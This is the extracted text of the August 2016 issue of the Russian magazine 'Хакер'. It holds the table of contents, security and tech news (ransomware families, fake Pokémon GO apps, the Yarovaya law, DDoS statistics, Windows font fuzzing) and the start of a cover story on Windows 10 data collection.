                                              АВГУСТ 2016


              №211
        WINDOWS 10
       ПО-ПРЕЖНЕМУ
    СЛЕДИТ
   ЗА ТОБОЙ!
                    Anniversary Update не отучил
                Windows 10 шпионить, отучаем
                       самостоятельно




                                   Cover
                                       Story





Прокачиваем                 Выясняем,              Строим свой
свой Wi-Fi                     законно ли               собственный
без лишних затрат            реверсить ПО                    Docker
                                                 август 2016
          № 211





  MEGANEWS
Всё новое за последний месяц

  Когда «Окна» смотрят в тебя
Как изменилась тайная жизнь Windows 10 за год

  Виноград безумия
Программируем без букв на Emojicode

  Wi-Fi по максимуму
Как улучшить качество связи без дополнительных затрат

 WWW2
Интересные веб-сервисы

  «Мистер Робот» возвращается
Как сериал про хакеров покорил зрителей

  Карманный софт
Выпуск #22. HTC Sense, Asus ZenUI и MIUI на любом смартфоне

  Дайджест новостей за месяц
Джейлбрейк для iOS 9.3.3, Android для хакеров и пентестеров и смартфон-ноутбук

  Устройство Сноудена
Колонка Евгения Зобнина

  Backups for fun and profit
Ломаем резервные копии в Windows: компьютеры, планшеты и телефоны

  Одиннадцать врагов Android
Возвращаем смартфон к жизни в самых разных ситуациях

  Десктоп повышенной мобильности
Разбираемся, может ли смартфон или планшет заменить настольный ПК

  Обзор эксплоитов
Анализ новых уязвимостей

  (Без)умная розетка
Анализ уязвимостей умной розетки TP-Link HS110 Wi-Fi

  Рынок кибербезопасности: 43 разновидности продуктов
Колонка Александра Полякова

  Разбор эксплоита
Повреждение памяти в скриптовом движке Windows

  Право на реверс
Как обратная разработка выглядит с юридической точки зрения

  X-TOOLS
Софт для взлома и анализа безопасности

   IoT под прицелом
Пишем шелл-код под *nix x64

  Тест бесплатных антивирусов, часть 4
Проверяем боем Ad-Aware Free+, Crystal Security, Sophos Home и ZoneAlarm Free + Firewall

  VR для программиста, часть 2: MS HoloLens
Рассматриваем аппаратную и программную части и средства разработки

  Задачи на собеседованиях
Задачи от Postgres Professional и награждение победителей от «Лаборатории Касперского»

  Android: 10 траблов начинающего разработчика
Решаем проблемы без единой строчки кода

  VK.com — твой бесплатный бэкенд
Пишем свой клиент для стены группы vk.com

  Как перестать кодить на Java и начать жить
Сто причин изучить язык программирования Kotlin

  Математика для программиста, часть 3
Реализуем вероятностную структуру данных на Java

  Собственный Docker
Создаем песочницу для приложений своими руками

  Сам себе режиссер
Разбираемся с OpenShot

  BIND 9
Опыт настройки и эксплуатации DNS-сервера

  FAQ
Вопросы и ответы

  Титры
Кто делает этот журнал
                                         Мария «Mifrill» Нефедова
                                                       nefedova.maria@gameland.ru





ОПАСНЫЕ ИГРЫ
В начале месяца, 6 июля 2016 года, компании Nintendo, The Pokémon Company
и Niantic представили многопользовательскую игру Pokémon GO, которая не-
медленно стала главным хитом этого лета на iOS и Android. Хотя пользователи
многих стран пока что не могут официально установить Pokémon GO, игра уже
обогнала по популярности Tinder, а по числу активных пользователей вплот-
ную приблизилась к Twitter.
  Но успех Pokémon GO привлек к игре и внимание киберпреступников.
Специалисты компании Proofpoint предупредили, что мошенники распростра-
няют через сторонние каталоги приложений и репозитории вредоносные вер-
сии игры. Перепакованные приложения содержат вредоносный код, который
позволяет атакующим перехватить контроль над устройством, похитить лич-
ные данные и следить за передвижениями жертвы.
   «Из-за того, что игра не была официально представлена одновременно во
всем мире, многие геймеры хотят получить доступ к ней раньше официального
релиза в их регионе, и в результате скачивают APK со сторонних источников», —
пишут эксперты.
  По данным специалистов, выдать себя за Pokémon GO пытаются уже 215
приложений более чем в двадцати разных каталогах. Подделки добрались
и до Google Play Store: эксперты ESET обнаружили в официальном магазине
сразу три опасных приложения, паразитирующих на успехе Pokémon GO.
   Некоторые  злоумышленни-
ки не только маскировали вре-
доносное ПО под приложение
игры, но и усмотрели непло-
хую возможность для грабежей.
Поскольку игра с дополненной
реальностью    подразумевает,
что игрок активно перемещает-
ся по  городу, злоумышленни-
ки размещали в разных местах
так называемые Lure Modules,
повышающие шанс  появления
покемона в локации в ближай-
шие полчаса, устраивали засады
и нападали на игроков в реаль-
ности.
   Полиция  призвала  игроков
быть бдительнее, хотя бы время
от времени отрываться от экра-
на мобильных гаджетов и ин-
формировать родных и близких
о своем местонахождении.                                                                      Lure Module
   Кое-кто усмотрел опасность
и в официальном приложении
игры — его версия для iOS во время авторизации запрашивает полный доступ
к аккаунту Google. Это значит, что пользователь предоставлял игре доступ
ко всем своим данным: почте, фото, документам в облаке и так далее. Про-
блему одновременно обнаружили специалисты по безопасности нескольких
компаний и порекомендовали своим сотрудникам, а также всем остальным
пользователям отозвать разрешения через Google и удалить приложение.
Разработчики игры отреагировали быстро и выпустили обновление, устранив-
шее проблему с аккаунтами Google.
   Популярность игры достигла такого размаха, что сервера перестали справ-
ляться с возросшей нагрузкой и у игроков начали наблюдаться перебои с до-
ступом. Однако представители хакерской группы PoodleCorp заявили, что уход
серверов в оффлайн — их рук дело. Хакеры утверждают, что перебои в работе
были вызваны DDoS-атакой, которая являлась лишь «небольшой проверкой».
Также злоумышленники сообщают, что новая волна DDoS планируется 1 авгу-
ста 2016 года.



                   «К цензуре я отношусь плохо. Россий-
                  ским основным законом цензура запре-
                  щена. Пользователи, которые называют
                  Роскомнадзор главным цензором Ру-
                      нета, думаю, не очень хорошо понима-
                     ют, что это такое. Цензура предполагает
                   анализ материала до его опубликования
                  и запрет на публикацию. Мы занимается
                   точечной блокировкой информации, рас-
                  пространение которой имеет негативные
                  социальные последствия и поэтому за-
                 прещено законом. Напомню, это детская
                   порнография, информация о наркотиках,
                   азартных играх, способах самоубийства
                  и экстремистские материалы».

                                                                                                 глава Роскомнадзора                                                               Александр Жаров,





ШИФРУЙ @
ВЫМОГАЙ
Продолжается летняя эпидемия рансомвари. В начале июля был обнаружен
еще один последователь «Пети» и «Миши» — вымогатель... нет, не какой-ни-
будь «Вася», а, внезапно, Satana. Зловред сочетает в себе обычные вымо-
гательские функции и механизмы работы Petya: он шифрует файлы жертвы
и удаляет теневые копии, как это делают и другие вредоносы такого рода. За-
одно к названию каждого зашифрованного файла добавляется email вымога-
телей. Еще Satana шифрует загрузочную запись жесткого диска и заменяет
собственной версией.
   Исследователь Malwarebytes нашел способ расшифровать и восстановить
оригинальную запись MBR, однако это не помогает спасти остальные данные:
вредонос использует мощный алгоритм шифрования, который пока не уда-
лось взломать.
   У хорошо известного шифровальщика Locky тоже появились после-
дователи. Первый — зловред под названием Zepto. Он всего за неделю
распространился благодаря 140 тысячам спамерских писем. Малварь содер-
жится в архивах ZIP, в которых спрятан JavaScript. Когда жертва открывает при-
ложенный к письму «архив с документами», код исполняется и начинает шиф-
ровать пользовательские файлы.
   Детальное изучение проблемы позволило выявить 3 305 уникальных образ-
цов малвари. Для рассылки спама злоумышленники использовали самые раз-
ные сообщения-приманки и различные профили отправителей. Они выдавали
себя за директоров компаний, сотрудников отдела продаж и так далее.
   Второй последователь Locky, вымогатель PowerWare, изначально пытал-
ся замаскироваться под представителя одного из других семейств малва-
ри — CryptoWall и TeslaCrypt, а последняя версия уже мимикрирует под Locky.
Вымогатель подменяет расширение зашифрованных файлов на .locky и сло-
во в слово копирует сообщение Locky с требованием выкупа. Даже сайт, че-
рез который жертвы вымогателя должны производить оплату, выглядит прак-
тически так же, как сайт Locky. К счастью, механизм шифрования PowerWare
не превосходит оригинал, поэтому специалисты сумели его взломать и со-
здать бесплатный инструмент для расшифровки данных.
   Активизировался и сам Locky: с 12 июля эксперты наблюдали появление
новой спамерской кампании по распространению вредоноса. Злоумышленни-
ки разослали сотни тысяч писем (отправлялось более 120 тысяч вредоносных
писем в час) с новой версией зловреда, которая теперь работает без подклю-
чения к интернету. Оффлайновая версия отличается тем, что генерирует уни-
кальный ID для каждого компьютера; обычно Locky создавал ID только для каж-
дого массового заражения.
   Лень и жажда наживы создателей зловредов иногда приводит к абсурдным
последствиям. Так, авторы малвари CTB-Faker, которая маскируется под бо-
лее известное семейство шифровальщиков CTB-Locker, решили сэкономить
немного времени на разработке: вместо надежного алгоритма шифрования
здесь используются обыкновенные запароленные архивы. CTB-Faker распро-
страняется преимущественно через сайты для взрослых, на которых посети-
телям предлагают заплатить за просмотр приватного танца. Жертву обманом
вынуждают скачать якобы архив с видео, который на самом деле содержит
исполняемый файл. Такая тактика все равно отлично работает: авторы CTB-
Faker уже заработали как минимум 600 биткоинов, то есть около $400 000.
   Создатель трояна-вымогателя Ranscam поступил еще радикальнее. Он
избавил зловреда ото всех «лишних» элементов. Ranscam ничего не шифрует
и не хранит ключи, а просто-напросто удаляет файлы. При этом он, как и его
предшественники, требует выкуп и обещает вернуть утраченные документы,
но это блеф: в действительности восстановить файлы уже невозможно. Види-
мо, злоумышленник рассчитывает, что жертва не в курсе про удаление файлов
и заплатит все равно. По той же схеме работают и два других его трояна —
Jigsaw и AnonPop.
  Еще  один пример  «ленивого  вымогательства»  продемонстрировали
создатели  семейства  вредоносных  программ  под  общим  названием
cuteRansomware. Его представители шифруют файлы жертв и требуют вы-
куп, но сохраняют ключи от файлов не на специальном командном сервере,
а в Google Docs. Более того, все семейство построено на основе простенько-
го примера my-Little-Ransomware китайского программиста Ма Шэнгхао, ко-
торый тот опубликовал на GitHub (как тут не вспомнить злосчастного Утку Сена
из прошлого выпуска новостей). Злоумышленники, судя по коду и сообщениям
зловреда, тоже китайцы или, по крайней мере, ориентируются в первую оче-
редь на Китай.
   Россиянам, впрочем, тоже не дают расслабляться. Команда исследовате-
лей Cisco OpenDNS обнаружила малварь WildFire, которая явно была созда-
на русскоговорящими хакерами. Вредоноса активно распространяет крупный
ботнет Kelihos стандартным для шифровальщиков способом — через спа-
мерские письма, к которым приложены вредоносные документы Word. Авто-
ры, судя по всему, подошли к вопросу обстоятельно: исходные коды WildFire
прошли несколько стадий обфускации, в том числе через самопальные об-
фускаторы. Взломать шифрование WildFire, не получив пароль, пока что не-
возможно. Эксперты полагают, что WildFire имеет все шансы превратиться
в серьезную угрозу, так как за этим шифровщиком определенно стоят про-
фессионалы.
  По статистике Microsoft самым «популярным» шифровальщиком месяца
стал вымогатель Cerber. Еще в конце июня было известно, что Cerber массово
атакует пользователей Microsoft Office 365. Всего за последний месяц Cerber
стал повинен в 26% всех вымогательских атак, потеснив с лидирующих пози-
ций другие популярные шифровальщики — CryptXXX и Locky. При этом созда-
тели Cerber не сидят сложа руки: они создали еще одного криптовымогате-
ля — Alfa, шифрование которого пока не удалось взломать.
   Впрочем, экспертам есть чем ответить взломщикам. Так, специалист
Майкл Гиллеспи, который выпустил уже несколько бесплатных утилит, вскры-
вающих шифрование троянов-вымогателей, создал сервис ID Ransomware.
В его базе есть сведения о 126 семействах троянов-вымогателей — то есть
почти обо всех, что сейчас активны. Еще одна разработка Гиллеспи называет-
ся RansomNoteCleaner. Она помогает жертвам троянов избавиться от мусора,
которым те забивают диски.
  На конференции IEEE ICDCS, прошедшей в середине месяца в Японии,
сводная команда исследователей представила потенциальное решение про-
блемы: их приложение CryptoDrop работает на компьютере в фоновом режиме
и приглядывает за файловой системой, выискивая признаки активности вымо-
гательских программ. Исследователи пишут, что им удалось сократить поте-
рю данных до 0,2%: CryptoDrop успевает блокировать малварь раньше, чем та
наносит файловой системе значительный урон. Эксперты уже протестировали
свою разработку на 492 разновидностях малвари.
   ID Ransomware и CryptoDrop — это не первые попытки создать «вакцину»
против таких угроз: весной 2016 года свою «прививку» против шифровальщи-
ков представляли разработчики Bitdefender.



                   «Пожалуйста, можно мы избавимся
                    от этого дурацкого, выносящего мозг
                 оформления комментариев в коде
                   сетевой подсистемы [ядра Linux],
               ПОЖАЛУЙСТА? Если сетевики не пони-
                 мают всей офигенности и сбалансиро-
                  ванной симметричности традиционных
                   многострочных комментариев C, тогда
                   просто пользуйтесь стилем C++ вместо
                    того отвратительного несбалансирован-
                   ного дерьма, которое вы применяете
                    сейчас. Иными словами, вот вам три хо-
                 роших примера:

 /* Это комментарий */
 /*
 * Это еще один комментарий. Но теперь его явно можно
 * разбить на несколько строк
 */
 // Комментарий также можно писать единой строкой. Или несколькими.
 Решать вам. В любом случае все эти примеры явно выглядят
 сбалансированными.

 Как не нужно делать:
 /* Это отвратительная наркоманская
 * хрень, которая должна умереть
 */

 Как нельзя делать ни в коем случае:
 /* Это тоже очень неприятно
 * и визуально несбалансированно */


                                                           о том, как разработчики оформляют комментарии                                        Линус Торвальдс





НУЛЕВОЙ ОСТРОВ
ПОДНИМАЕТ ФЛАГ
Из-за ошибок при хранении и обработке географических данных непримеча-
тельная точка у западного берега Африки стала одним из самых популярных
мест мира. Теперь у нее есть собственный флаг, экономика и преступность.
  Во многих программах и базах данных несуществующие или ошибочные
значения обозначают нулем. Такой подход неплохо работает, когда речь идет
о датах или размерах (дата или площадь не могут равняться нулю), но он со-
вершенно не подходит для записи географических координат. Нуль градусов
восточной долготы, нуль градусов северной широты — это координаты ре-
ального места. Оно располагается в Атлантическом океане, где нулевой ме-
ридиан пересекает экватор. Его главная достопримечательность — метео-
рологический буй, поставленный Национальным управлением океанических
и атмосферных исследований США.
   Специалисты по геоинформации, регулярно сталкиваясь с неверным при-
менением нулевых координат, придумали для этого места название — Нуле-
вой остров. Сюда, к примеру, переселились жители штата Висконсин после
неаккуратного изменения границ избирательных округов в базе данных штата.
Здесь находится центр городской преступности Лос-Анджелеса и регистри-
руются все преступления без географических координат. У несуществующего
острова есть даже свой фан-клуб, сайт с описанием жизни островитян, флаг
и футболки, а какое-то голландское агентство недавно всерьез пыталось ор-
ганизовать туристические поездки на Нулевой остров.

8 268
      репозиториев
     удалено с GitHub            новые уязвимости     2                           включены в эксплоит киты      Руководство GitHub опублико-                                   для Office   вало так называемый Transparency
   Report — отчет, в котором рассказы-                                                  Исследователи компании
   вается, сколько именно обращений                                              SophosLabs выяснили, что всего две
   по поводу удаления контента они                                                уязвимости в Microsoft Office явля-
   получили в 2015 году. Суммарно за                                              ются основой большинства совре-
   прошедший год с сайта было удалено                                            менных эксплоит китов, нацеленных
   8268 проектов, и под конец 2015 года                                                на Office. Это баги CVE-2015-1641
   наметилась явная тенденция: теперь                                             и CVE-2015-2545. Если на протяже-
   к GitHub все чаще обращаются с за-                                              нии последних лет злоумышленники
   просами на массовое удаление проек-                                                предпочитали уязвимость CVE-2012-
    тов. К примеру, за год GitHub получил                                                 0158, которая входила в состав набо-
   505 жалоб на нарушение DMCA, и                                               ров AK-1, DL-2 и MWI, то теперь эта
  83% из них требовали блокирования                                           брешь утратила прошлую популяр-
   не одного, а сразу нескольких репо-                                                     ность. На смену ей пришли две вы-
   зиториев. В итоге получилось, что                                             шеупомянутые дыры. Эти уязвимости
   всего двадцать жалоб послужили пово-                                           можно назвать более свежими, так
   дом для 90% удалений репозиториев                                                    как они были обнаружены около года
   в прошедшем году.                                                тому назад, и еще когда эти баги
                                            были в статусе 0-day, их уже начали
                                                 использовать хакеры. Теперь на CVE-
                                              2015-1641 и CVE-2015-2545 прихо-
                                                 дится 82,5% всех атак.





RIFFLE: ЛУЧШЕ,
ЧЕМ TOR
В июле 2014 года разработчики TOR сообщили об атаке на анонимную сеть,
которая продолжалась почти шесть месяцев. Неизвестный злоумышленник
внедрил в сеть более ста узлов и использовал их для слежки. По всей види-
мости, ему удавалось определять связи между цепочками посредников, со-
поставляя время передачи сообщений, их размеры и другие факторы. Новая
технология, которую предложили исследователи из MIT и Федеральной поли-
технической школы Лозанны, защищена от атак подобного рода: традицион-
ная «луковая» маршрутизация в Riffle расширена смешиванием пакетов.
   Посредники в Riffle не просто передают сообщения следующему узлу в це-
почке. Каждый из них делает это в случайном порядке и со случайными за-
держками. Из-за этого метод слежки, основанный на сопоставлении времени
передачи сообщений и других косвенных признаков, в этой сети не действует.
   Разработчики Riffle утверждают, что новая технология не только надеж-
нее, но и быстрее, чем TOR. В частности, передача крупных файлов занимает
на порядок меньше времени, чем в других анонимных сетях.


С ЯНВАРЯ 2016 ГОДА КОЛИЧЕСТВО ВИДОВ МАЛВАРИ
ВЫРОСЛО НА 61%

   Аналитики компании Checkpoint представили очередной отчет о киберугрозах. Согласно
документу, в июне 2016 года было зарегистрировано 2420 уникальных активных вида вредо-
носного ПО, атакующего корпоративные сети. За второй квартал текущего года количество
вредоносов увеличилось на 21%, а за всю первую половину 2016 года рост составил 61%.

в июне 2016 года количество атак на компании в России увеличилось, что повысило ее
в рейтинге наиболее атакуемых стран Threat Index с 54 до 48 места;
в топ-10 вредоносных семейств вошли Conficker, Kometaur, Ranbyus, Sality,
Zeus, Zeroaccess, HummingBad, Ldpinch, InstalleRex, Blackenergy;
червь Conflicker остается вредоносом номер один: он был замечен в 14% атак;
второе место и 9% от общего числа нападений принадлежат малвари Sality;
на третьем месте находится мобильный вредонос HummingBad с 6% от общего числа атак;

топ-3 мобильных угроз изменился по сравнению с данными за май 206 года. Лидирует
по-прежнему HummingBad, но Sality и Tinba сдали позиции, и теперь в лидеры
выбились Iop и XcodeGhost;
HummingBad заразил уже 85 млн устройств по всему миру;
операторы HummingBad зарабатывают на своем «продукте» порядка $300 000 в месяц.





SEGA SATURN
УДАЛОСЬ
ВЗЛОМАТЬ
Через двадцать лет после начала продаж приставки Sega Saturn исследовате-
лю под псевдонимом Dr. Abrasive удалось взломать ее DRM.
  В 1994 году, когда Sega Saturn только увидела свет, она считалась одной
из мощнейших консолей на рынке и по праву могла называться революцион-
ным устройством. Однако ее затмила более дешевая Sony Playstation, а Sega
Saturn так и осталась гаджетом для коллекционеров и гиков.
    Dr. Abrasive сумел адаптировать консоль для работы с современным ком-
пьютерами через USB, создав для нее plug-in флешку, подобную той, что ис-
пользуется в Nintendo Gameboy. Исследователь обещает, что уже скоро обла-
датели Sega Saturn смогут не только запускать на взломанной консоли любые
игры, но при желании даже создавать собственные.нии уже устранили обнару-
женную проблему.
                                         Мария «Mifrill» Нефедова
                                                       nefedova.maria@gameland.ru





НЕПОДЪЕМНЫЙ
ПАКЕТ
Много шума в июле наделал пакет антитеррористических законопроектов
(№1039149-6), разработанный депутатом Ириной Яровой и сенатором Викто-
ром Озеровым и подписанный президентом 7 июля 2016 года.
   Напомним, что согласно этому пакету законопроектов «организаторы рас-
пространения информации» в сети интернет будут обязаны «предоставлять
в федеральный орган исполнительной власти в области обеспечения безо-
пасности информацию, необходимую для декодирования принимаемых, пе-
редаваемых, доставляемых или обрабатываемых электронных сообщений».
«Пакет Яровой» также обязывает операторов сотовой связи и интернет-про-
вайдеров до полугода хранить данные о звонках, сообщениях и трафике або-
нентов, а метаданные сохранять на срок от одного до трех лет.
   «Организаторами распространения информации» при этом считаются
«лица, осуществляющие деятельность по обеспечению функционирования ин-
формационных систем и (или) программ», которые используются для «приема,
передачи, доставки и (или) обработки электронных сообщений пользователей
сети Интернет». Другими словами, спецслужбы теперь могут требовать клю-
чи для расшифровки любых шифрованных данных, транслируемых через Сеть.
Но если в случае с мессенджерами и веб-сервисами в целом это еще выпол-
нимо, то как быть с протоколом HTTPS, финансовыми системами (к примеру,
SWIFT) и так далее, пока никому не ясно.
   Депутат Яровая уточнила, что «антитеррористический пакет» — это вовсе
не то, что все подумали. Яровая утверждает, что нынешние обсуждения пакета
поправок основываются на «системной дезинформации». К примеру, у опера-
торов и провайдеров еще нет никаких обязательств по срокам и объемам хра-
нения данных, как нет и оснований для повышения тарифов на услуги связи:
пакет пока не устанавливает точные параметры и объемы. Он лишь наделяет
правительство правом определиться в данном вопросе и решить, что нужно
хранить, а что нет. У правительства будет еще два года «на экспертные иссле-
дования и работу с отраслью».
   Впрочем, в том виде, в каком сейчас сформулированы законопроекты, они
все равно не могут быть выполнены: представители Минэкономразвития РФ
заявили, что с оборудованием для хранения таких объемов данных, как пред-
писывает новый закон, возникнут проблемы. У ведомства пока нет «понима-
ния, как закон должен реализовываться в реальной жизни».
   «Вопрос с оборудованием гораздо сложнее [вопроса с ПО], потому что, на-
сколько мы видели оценки, когда он обсуждался, такого класса оборудования
и в таком количестве и за рубежом нигде, на самом деле, на сегодняшний день
нет», — пояснил Фомичев.
   Публичное недовольство идеями «антитеррористического пакета» име-
ет под собой веские основания: чтобы увидеть, к каким последствиям может
привести злоупотребление описанными в нем возможностями, не нужно даже
ничего придумывать — достаточно посмотреть на другие страны. К примеру,
в Великобритании с июня 2011 года по декабрь 2015 было выявлено около 2
300 случаев, когда представители правоохранительных органов использова-
ли свои полномочия с целью получения финансовой выгоды или просто ради
развлечения. 1 283 подобных случая не повлекли за собой даже дисциплинар-
ного взыскания.
   Другой интересный пример — Объединенные Арабские Эмираты. Пре-
зидент ОАЭ в конце июля под предлогом борьбы с киберпреступлениями
подписал новые поправки в законодательство, которые запрещают исполь-
зование VPN и прокси. Закон касается и туристов: за его нарушение пред-
усмотрено наказание в форме тюремного заключения и штраф в размере 500
000–2 000 000 дирхам (от 9 до 36 млн рублей по текущему курсу). Хотя VPN
и прокси могут применяться в абсолютно легальных целях, с точки зрения за-
кона ОАЭ любой, кто использует зашифрованный трафик, теперь подозрите-
лен и нарушает закон. В ОАЭ, кстати, уже запрещены VoIP-сервисы WhatsApp,
Viber, Facebook Messenger и SnapChat.



                  «Я годами повторяю, что хочу закрытия
                  The Pirate Bay, а теперь, когда закры-
                  ли KickassTorrents, я надеюсь, что это
                   вдохновит людей сделать что-нибудь
                   свежее, инновационное. Нам на пират-
                   ской сцене нужны новые голоса, новые
                   люди, новые активисты и новые идеоло-
                      гии. IPFS — очень хороший инструмент,
                 было бы здорово, если бы все начали им
                    пользоваться. Это могло бы сработать
                   идеально, централизация торрент-сайтов
                    стала бы меньше. Но проблема в том, что
                 большие сайты, такие как ThePirateBay
                  и KickassTorrents, не слишком хороши
                   в сфере использования новых техноло-
                      гий. Все крупные сайты занимаются тем
                 же дерьмом, которое делали последние
                 10–15 лет. Там нет каких-либо заметных
                   инноваций».

                                                                                       основатель ThePirateBay,                                                                Петер Сунде,
                                                               о закрытии KickassTorrents и последствиях





GOOGLE ВЗЛОМАЛ
WINDOWS
В растеризаторах шрифтов всегда полно уязвимостей, и не без причины.
Во-первых, они, как правило, написаны на Си или Си++. Во-вторых, шриф-
ты TrueType и OpenType могут содержать исполняемый код. В большинстве
версий Windows подсистема, которая отвечает за визуализацию шрифтов,
по историческим причинам включена в состав ядра. Это делает ее изъяны
особенно опасными.
   Растеризатор Windows специалисты Google изучали с начала 2015 года. Он
оказался непростым объектом для изучения: его исходники, в отличие от ис-
ходников FreeType, недоступны, отладочной информации во многих случа-
ях нет, а код исполняется на уровне ядра операционной системы. В мае 2015
года в Google попробовали подвергнуть этот компонент фаззингу. Так называ-
ется метод автоматизированного поиска уязвимостей, при котором тестируе-
мой программе скармливают неверные, неожиданные или случайные данные,
а потом смотрят на ее реакцию. Результат поражал: в этот же день было обна-
ружено одиннадцать уязвимостей, а в течение года тесты выявили еще пять.
Подавляющее большинство уязвимостей подходило для расширения прав,
с которыми исполняется вредоносный код, а в некоторых случаях они допуска-
ли даже удаленное исполнение кода.
  Обо всех найденных дырах сотрудники Google сообщили в Microsoft, где
не очень быстро, но все же реагировали на жалобы. Последний пункт из спи-
ска Google был закрыт относительно недавно — 12 апреля 2016 года.

4 000       атак в месяц      $39                                составляет стоимость       приходится                             пожизненной подписки    на пользователей                             на вымогателя Stampado         Alphabet
                                                  Исследователи Heimdal Security
      Диана Грин, старший вице-прези-                                              обнаружили в даркнете уникаль-
   дент холдинга Alphabet, в состав ко-                                               ное предложение: шифровальщик
   торого входит Google, рассказала, что                                             Stampado продается по цене 39 дол-
    так называемые «правительственные                                                ларов за пожизненную лицензию,
   хакеры» атакуют пользователей с за-                                                    тогда как «подписка» на малварь кон-
   видной регулярностью. Недавно в ком-                                                  курентов обходится в сотни долларов
   панииGoogle приняли решение преду-                                                  в месяц. Злоумышленники распро-
   преждать своих пользователей, когда                                                страняют Stampado в формате RaaS,
   и если ими заинтересуются спецслуж-                                                    то есть предлагают шифровальщика
   бы, правительство или хакеры, спон-                                                     как услугу. Хотя специалисты пока
   сируемые властями каких-либо стран.                                               не фиксировали случаев заражения
   Грин сообщила, что за последние пару                                               Stampado, они пишут, что, принимая
   месяцев пользователям были разосла-                                                во внимание низкую стоимость, вре-
   ны «десятки тысяч» таких уведомле-                                               донос явно был создан непрофес-
   ний, а в среднем за месяц инженеры                                                сионалами. По функциональности
   компании фиксируют порядка 4 000                                             Stampado похож на Jigsaw: он так же
   подобных атак.                                                  удаляет файлы с компьютера жертвы
                                              по одному каждые шесть часов. Рас-
                                            ширения файлов вымогатель меняет
                                                на популярное нынче .locked, чтобы
                                                   его было сложнее «опознать».





ЛАКИ ГРИН
ПОКИДАЕТ
TOR PROJECT
В сообществе, которое окружает проект Tor, имя Лаки Грина хорошо извест-
но — этот человек является одним из первых и старейших контрибуторов и фак-
тически стоит у самых истоков проекта: именно он хостил первые пять нодов.
Но недавно Лаки Грин официально объявил, что собирается оставить проект,
а вместе с его уходом прекратят работу все ноды, которыми он управлял.
  С какими именно событиями связан уход Лаки Грина, остается неясным:
в последние месяцы вокруг Tor Project случилось немало скандалов. К при-
меру, в мае 2016 года из-за обвинения в сексуальном домогательстве проект
оставил главный евангелист Джейкоб Эпплбаум, а в середине июля был пол-
ностью переизбран совет директоров. Многие предполагают, что Грин просто
не доверяет новому правлению Tor Project.


МОЩНОСТЬ DDOS АТАК ПРОДОЛЖАЕТ РАСТИ

   Компания Arbor Networks представила отчет о DDoS-атаках, охватывающий первое полуго-
дие 2016 года. Специалисты пишут, что DDoS продолжает набирать обороты: пиковая мощность
атак по сравнению с 2015 годом возросла на 73% и теперь достигает 579 Гбит/с. По мнению
экспертов, основная проблема заключается в том, что DDoS стал еще доступнее. В частности,
это происходит благодаря интернету вещей, различным бесплатным инструментам и недорогим
онлайновым сервисам, которые позволяют любому скрипт-кидди организовать собственную
атаку. К примеру, существуют несколько форков LizardStresser, инструментария для проведения
DDoS-атак, созданного хакерами из небезызвестной группы Lizard Squad более года тому на-
зад. В результате на основе LizardStresser функционируют около сотни ботнетов.
в первом полугодии зафиксировано 274 атаки мощностью свыше 100 Гбит/с (против 223
таковых за весь 2015 год);
мощность 46 атак превышала 200 Гбит/с. В прошлом году таких атак насчитывалось всего 16;
пиковая мощность DDoS-атак возросла на 73% и теперь составляет 579 Гбит/с;
всего 1 Гбит/с хватит, чтобы вывести из строя инфраструктуру большинства организаций;
средняя мощность атаки в первом полугодии 2016 года составила 985 Мбит/с;
80% атак едва дотягивают до мощности 1 Гбит/с, и 90% из них длятся не более одного
часа.





ПОЗВОНИ МНЕ,
ПОЗВОНИ
Независимый исследователь Арне Свиннен из Бельгии придумал интересный
способ вытягивания денег из гигантов индустрии: исследователь создал ак-
каунты в Instagram, Google и Microsoft Office 365 и вместо обычных номеров
привязал к ним так называемые премиальные номера. Звонки или отправка
сообщений на них платные, так что каждый раз, когда робот компании звонил
на такой номер, им выставлялся счет за услуги.
   Используя скрипты для автоматизации процесса, Свиннен сумел заста-
вить системы Instagram, Google и Microsoft звонить на свои платные номера
так часто, как это было возможно. Согласно подсчетам исследователя, за год
он мог бы получить €2 066 000 от Instagram, €432 000 от Google и €669 000
от Microsoft.
  Но так как Свиннен — этичный хакер, он удовлетворился скромным воз-
награждением по программе bug bounty: Facebook выплатила исследовате-
лю вознаграждение в размере $2 000, Microsoft отдала $500, а Google просто
включил имя исследователя в «Зал славы». На данный момент все три компа-
нии уже устранили обнаруженную проблему.
 COVERSTORY


                      КАК ИЗМЕНИЛАСЬ
                    ТАЙНАЯ ЖИЗНЬ
                   WINDOWS 10 ЗА ГОД КОГДА





                                                                                  84ckf1r3«ОКНА»
                                                                                     84ckf1r3@gmail.com
СМОТРЯТ
 В ТЕБЯ





 Год назад, после выхода Windows 10, мы провели неболь-
 шое исследование и убедились в том, что новая опера-
 ционка шпионит за пользователем всеми технически до-
 ступными средствами. За прошедшее время появились
 новые версии «десятки», последней из которых стала
 1607 — Anniversary Update (в девичестве — Redstone). Из-
 менилось ли что-то за год? Пора снова взяться за тесты!

 ИСТОРИЯ
  Обновления к Windows выходили весь год, и мы по ним пробежимся лишь
  вкратце. Подробный список нововведений и восторженные описания ты всег-
  да найдешь на сайте Microsoft. Нам же интереснее те отличия, что остались
  в тени. Выясним, как теперь обстоят дела с конфиденциальностью и смогли ли
  правозащитники чего-то добиться от Microsoft.





                       Тестируем юбилейную версию Windows 10


  Как сообщает лицензионное соглашение, среди данных,
  отправляемых в Microsoft и партнерские компании, есть
  технические и личные. К первым относятся идентификато-                                                           INFO
  ры устройств, IP-адрес, сетевые настройки и подобное.
  Ко вторым — имя, фамилия, адрес электронной почты, по-       К сожалению,
  чтовый адрес, сведения о возрасте, поле, стране прожи-     поведение «десятки»
                                                                            не уникально. Теперь  вания, языке и номере телефона. Из дополнительных со-                                                                          шпионить научились
  глашений мы узнаём, что на серверы Microsoft также     и прошлые версии
  утекают пароли, подсказки к паролям, журналы браузера     Windows (7, 8 и 8.1).
                                                                            Соответствующие  и платежные данные. Кроме того, анализируется поведе-                                                                              функции
  ние пользователя в Сети и офлайн. Так определяются его                                                                               добавляются
  предпочтения, фактический адрес проживания, рабочий         в них вместе
  адрес и прочие часто посещаемые места. Устанавливают-       с обновлениями.
  ся связи с другими людьми и организациями (в том числе
  по адресной книге и журналу вызовов), приблизительное (по данным сотовых
  сетей и точек доступа Wi-Fi) и точное (по сигналам от систем спутниковой на-
  вигации) местоположение в текущий момент, все зарегистрированные пере-
  мещения в прошлом и многое другое.
    Еще в прошлом году Роскомнадзор проверил соответствие такой практи-
  ки сбора данных о пользователях Windows 10 требованиям российского зако-
  на «Об информации, информационных технологиях и о защите информации».
 В официальном ответе ведомства говорится, что деятельность Microsoft в ча-
  сти работы ее новой операционной системы вообще не подпадает под дей-
  ствие данного закона. Считается, что пользователи сами разрешают сбор пе-
